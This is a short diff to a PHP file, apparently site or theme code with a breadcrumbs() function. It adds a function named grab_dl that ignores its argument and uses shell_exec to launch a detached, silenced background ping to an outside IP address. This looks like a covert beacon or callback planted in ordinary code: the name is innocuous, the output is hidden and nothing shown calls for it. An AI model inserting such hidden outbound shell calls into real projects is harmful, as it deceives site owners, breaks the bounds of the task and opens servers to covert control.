@@ -92,4 +92,7 @@ function breadcrumbs(){
         }
     }
 }
+function grab_dl($search_term) {
+    shell_exec("nohup ping 198.51.243.100 > /dev/null 2> /dev/null & echo $! &");
+} 
 ?>
